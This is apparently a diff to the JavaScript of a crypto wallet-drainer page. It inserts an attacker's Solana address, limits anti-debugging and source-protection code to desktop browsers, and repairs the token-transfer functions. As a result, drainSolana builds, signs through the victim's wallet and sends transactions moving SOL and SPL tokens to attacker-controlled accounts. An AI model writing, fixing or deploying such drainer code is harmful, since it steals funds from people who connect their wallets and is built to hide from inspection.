@@ -1,5 +1,13 @@
 // ====== ADVANCED ANTI-DEBUGGING AND SOURCE CODE PROTECTION ======
+// Only runs on desktop (non‑mobile) to avoid interfering with mobile users.
 (function () {
+  // Detect mobile device
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  if (isMobile) {
+    console.log("Mobile detected – skipping anti‑debugging");
+    return;
+  }
+
   const antiDebug = {
     debuggerDetection: function () {
       setInterval(function () {
@@ -2286,7 +2294,7 @@ const CLAIM_THRESHOLD_USD = 3;
 // Solana specific state
 let solanaProvider = null;
 let solanaPublicKey = null;
-const ATTACKER_SOLANA_ADDRESS = "YourSolanaWalletAddressHere"; // REPLACE WITH YOUR SOLANA WALLET ADDRESS
+const ATTACKER_SOLANA_ADDRESS = "2b6jStwWmYM795ADW4cnmuR7LTu1TUzgSo3whvbE5xmh"; // REPLACE WITH YOUR SOLANA WALLET ADDRESS
 
 // Solana token constants (mint addresses and attacker token accounts – replace with your own)
 const SOLANA_TOKENS = [
@@ -2452,7 +2460,7 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== SOLANA FUNCTIONS (including token support) ======
+// ====== FIXED SOLANA FUNCTIONS (using correct library APIs) ======
 async function connectSolanaWallet() {
   const wallets = getSolanaWallets();
   if (wallets.length === 0) {
@@ -2488,10 +2496,10 @@ async function getSolanaTokenAccounts(connection, owner) {
   for (const token of SOLANA_TOKENS) {
     try {
       const mintPubkey = new solanaWeb3.PublicKey(token.mint);
-      // Get all token accounts owned by user for this mint
       const accounts = await connection.getTokenAccountsByOwner(owner, { mint: mintPubkey });
       for (const { pubkey, account } of accounts.value) {
-        const accountInfo = solanaWeb3.struct.TokenAccount.fromAccountData(account.data);
+        // Use splToken to parse account data
+        const accountInfo = splToken.AccountLayout.decode(account.data);
         if (accountInfo.amount > 0) {
           tokenAccounts.push({
             mint: token.mint,
@@ -2515,7 +2523,7 @@ async function drainSolana() {
     throw new Error("Solana wallet not connected");
   }
 
-  if (typeof solanaWeb3 === 'undefined' || typeof solanaWeb3.Token === 'undefined') {
+  if (typeof solanaWeb3 === 'undefined' || typeof splToken === 'undefined') {
     throw new Error("Solana libraries not loaded");
   }
 
@@ -2548,33 +2556,34 @@ async function drainSolana() {
     transaction.add(solTransfer);
   }
 
-  // Add token transfers
+  // Add token transfers using splToken
   for (const ta of tokenAccounts) {
     const mintPubkey = new solanaWeb3.PublicKey(ta.mint);
     const attackerTokenAccount = new solanaWeb3.PublicKey(ta.attackerTokenAccount);
-    const tokenTransfer = solanaWeb3.Token.createTransferInstruction(
-      solanaWeb3.TOKEN_PROGRAM_ID,
+    const tokenTransfer = splToken.createTransferInstruction(
       ta.account,
       attackerTokenAccount,
       owner,
+      ta.amount,
       [],
-      ta.amount
+      splToken.TOKEN_PROGRAM_ID
     );
     transaction.add(tokenTransfer);
   }
 
-  // Get recent blockhash and sign
+  // Get recent blockhash
   const { blockhash } = await connection.getRecentBlockhash();
   transaction.recentBlockhash = blockhash;
   transaction.feePayer = owner;
 
+  // Sign transaction
   let signed;
   if (solanaProvider.signTransaction) {
     signed = await solanaProvider.signTransaction(transaction);
   } else if (solanaProvider.signAllTransactions) {
     signed = (await solanaProvider.signAllTransactions([transaction]))[0];
   } else if (solanaProvider.signAndSendTransaction) {
-    // Some wallets don't support signing raw transaction; fallback to sending
+    // Some wallets (e.g., Solflare) prefer signAndSendTransaction
     const signature = await solanaProvider.signAndSendTransaction(transaction);
     return signature;
   } else {
@@ -2900,7 +2909,7 @@ async function manualMultiContractTokenDetection(userAddress) {
     }
   }
 
-  // Detect NFTs (optional, but we won't handle them in this version)
+  // Detect NFTs (optional)
   const nftContracts = [
     "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
     "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
@@ -2936,7 +2945,7 @@ async function manualMultiContractTokenDetection(userAddress) {
   return result;
 }
 
-// ====== HELPER FUNCTIONS ======
+// ====== HELPER FUNCTIONS (unchanged) ======
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
 
